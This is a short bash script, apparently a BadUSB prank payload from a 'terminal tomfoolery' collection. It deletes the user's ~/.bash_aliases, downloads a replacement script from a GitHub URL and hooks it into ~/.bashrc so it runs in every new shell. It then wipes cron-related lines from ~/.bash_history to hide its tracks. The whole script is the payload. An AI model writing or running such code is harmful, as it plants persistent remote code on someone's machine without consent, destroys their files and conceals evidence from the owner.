#!/usr/bin/env bash

rm ~/.bash_aliases

B=~/.bashrc
AB=$(cat << 'EOF'
if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi
EOF
)
wget -q -O "~/.bash_aliases" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/tardis/tardis.sh"
if ! grep -q 'if \[ -f ~/.bash_aliases \]; then' "$B"; then
    echo -e "\n$AB" >> "$B"
fi
sed -i '/cron/d' ~/.bash_history
sed -i '/CRON/d' ~/.bash_history
history -c
history -r